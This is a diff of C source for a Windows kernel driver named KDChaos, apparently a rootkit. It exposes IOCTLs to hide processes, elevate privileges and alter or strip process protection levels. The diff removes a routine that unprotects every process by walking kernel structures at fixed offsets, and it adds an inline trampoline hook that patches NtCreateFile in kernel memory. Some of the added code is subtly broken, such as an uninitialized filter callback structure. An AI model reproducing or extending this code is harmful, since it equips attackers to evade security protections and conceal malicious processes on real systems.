@@ -1,41 +1,4 @@
-#include <ntifs.h>
-#include <ntdef.h>
-#include <minwindef.h>
-#include <ntstrsafe.h>
-#include <wdm.h>
-
-#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)
-
-
-UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");
-
-UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");
-
-char* PsGetProcessImageFileName(PEPROCESS Process);
-
-EX_PUSH_LOCK pLock;
+#include "header.h"
 
 
 typedef struct protection_levels {
@@ -62,52 +25,165 @@ protection_level global_protection_levels = {
     .PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11
 };
 
-int
-UnprotectAllProcesses(
-)
-{
-    PVOID process = NULL;
-    PLIST_ENTRY plist;
-    __try
+
+typedef struct x_hooklist {
+
+    BYTE NtOpenFilePatch[12] ;
+    void* NtOpenFileOrigin;
+    void* NtOpenFileAddress;
+    uintptr_t* NtOpenFileHookAddress;
+
+    BYTE NtCreateFilePatch[12];
+    BYTE NtCreateFileOrigin[12];
+    void* NtCreateFileAddress;
+    uintptr_t* NtCreateFileHookAddress;
+
+    int pID;
+    char filename;
+
+}hooklist, *Phooklist;
+
+hooklist xHooklist;
+
+
+NTSTATUS WINAPI FakeNtCreateFile(
+    PHANDLE            FileHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK   IoStatusBlock,
+    PLARGE_INTEGER     AllocationSize,
+    ULONG              FileAttributes,
+    ULONG              ShareAccess,
+    ULONG              CreateDisposition,
+    ULONG              CreateOptions,
+    PVOID              EaBuffer,
+    ULONG              EaLength
+) {
+
+
+    KMUTEX Mutex;
+    KeInitializeMutex(&Mutex, 0);
+    KeWaitForSingleObject(&Mutex, Executive, KernelMode, FALSE, NULL);
+
+    int requestorPid = 0x0;
+
+    write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
+
+    if (ObjectAttributes &&
+        ObjectAttributes->ObjectName &&
+        ObjectAttributes->ObjectName->Buffer)
     {
 
-        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
-        if (ret != STATUS_SUCCESS)
+        if (wcsstr(ObjectAttributes->ObjectName->Buffer, L"restricted.txt"))
         {
-            if (ret == STATUS_INVALID_PARAMETER)
+
+            DbgPrint("Blocked : %wZ.\n", ObjectAttributes->ObjectName);
+
+            FLT_CALLBACK_DATA flt;
+
+            DbgPrint("requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));
+
+            if ((ULONG)requestorPid == (ULONG)xHooklist.pID)
             {
-                DbgPrint("the process ID was not found.");
+
+                DbgPrint("process allowed\n");
+
+                NTSTATUS FakeStatus = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
+
+                write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));
+
+                KeReleaseMutex(&Mutex, 0);
+
+                return (FakeStatus);
             }
-            if (ret == STATUS_INVALID_CID)
-            {
-                DbgPrint("the specified client ID is not valid.");
-            }
-            return (-1);
+
+            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));
+
+            KeReleaseMutex(&Mutex, 0);
+
+            return (STATUS_ACCESS_DENIED);
         }
 
-        plist = (PLIST_ENTRY)((char*)process + 0x448);
-
-        while (plist->Flink != (PLIST_ENTRY)((char*)process + 0x448))
-        {
-            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);
-
-            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - 0x448 + 0x87a;
-
-            *(BYTE*)EProtectionLevel = (BYTE)0;
-
-            plist = plist->Flink;
-        }
     }
-    __except (EXCEPTION_EXECUTE_HANDLER)
+
+    NTSTATUS FakeStatus = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
+
+    write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFilePatch, sizeof(xHooklist.NtCreateFilePatch));
+
+    KeReleaseMutex(&Mutex, 0);
+
+    return (FakeStatus);
+}
+
+
+DWORD initializehooklist(Phooklist hooklist_s,fopera rfileinfo)
+{
+    if (!hooklist_s)
     {
+        DbgPrint("invalid Hook List provided\n");
+        return (-1);
+
+    }
+
+    UNICODE_STRING NtCreateFile_STRING = RTL_CONSTANT_STRING(L"NtCreateFile");
+
+    UNICODE_STRING NtOpenFile_STRING = RTL_CONSTANT_STRING(L"NtOpenFile");
+
+    hooklist_s->NtCreateFileAddress = MmGetSystemRoutineAddress(&NtCreateFile_STRING);
+
+    if (!hooklist_s->NtCreateFileAddress)
+    {
+        DbgPrint("NtCreateFile NOT resolved\n");
+
         return (-1);
     }
 
-    ObDereferenceObject(process);
+    memset(hooklist_s->NtCreateFilePatch, 0x0, 12);
+
+    hooklist_s->NtCreateFilePatch[0] = 0x48;
+    hooklist_s->NtCreateFilePatch[1] = 0xb8;
+
+    hooklist_s->NtCreateFilePatch[10] = 0xff;
+    hooklist_s->NtCreateFilePatch[11] = 0xe0;
+
+    DbgPrint("NtCreateFile resolved\n");
+
+    hooklist_s->NtOpenFileAddress = MmGetSystemRoutineAddress(&NtOpenFile_STRING);
+
+    if (!hooklist_s->NtOpenFileAddress)
+    {
+        DbgPrint("NtOpenFile NOT resolved\n");
+
+        return (-1);
+    }
+
+    memset(hooklist_s->NtOpenFilePatch, 0x0, 12);
+
+    hooklist_s->NtOpenFilePatch[0] = 0x48;
+    hooklist_s->NtOpenFilePatch[1] = 0xb8;
+
+    hooklist_s->NtOpenFilePatch[10] = 0xff;
+    hooklist_s->NtOpenFilePatch[11] = 0xe0;
+
+    DbgPrint("NtOpenFile resolved\n");
+
+    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
+
+    memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));
+
+    memcpy(hooklist_s->NtCreateFileOrigin, hooklist_s->NtCreateFileAddress, 12);
+
+    hooklist_s->pID = rfileinfo.rpid;
+
+    write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));
+
+    DbgPrint("Hooks installed resolved\n");
+
     return (0);
 }
 
-int ChangeProtectionLevel(int pid,BYTE protectionOption)
+DWORD
+ChangeProtectionLevel(int pid,BYTE protectionOption)
 {
     PVOID process = NULL;
 
@@ -141,7 +217,7 @@ int ChangeProtectionLevel(int pid,BYTE protectionOption)
 }
 
 
-int
+DWORD
 PrivilegeElevationForProcess(
     int pid
 )
@@ -252,7 +328,7 @@ PrivilegeElevationForProcess(
     return (0);
 }
 
-int 
+DWORD 
 HideProcess(
     int pid
 )
@@ -321,6 +397,9 @@ unloadv(
     PDRIVER_OBJECT driverObject
 )
 {
+    write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
+
+
     IoDeleteSymbolicLink(&SymbName);
 
     IoDeleteDevice(driverObject->DeviceObject);
@@ -402,6 +481,16 @@ NTSTATUS processIoctlRequest(
          RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
 
          pstatus = ChangeProtectionLevel(inputInt, global_protection_levels.PS_PROTECTED_WINDOWS_LIGHT);
+
+         DbgPrint("Process Protection changed to Windows ");
+     }
+
+     if (pstack->Parameters.DeviceIoControl.IoControlCode == RESTRICT_ACCESS_TO_FILE_CTL)
+     {
+         fopera rfileinfo = {0};
+         RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
+
+         pstatus = initializehooklist(&xHooklist, rfileinfo);
 
          DbgPrint("Process Protection changed to Windows ");
      }
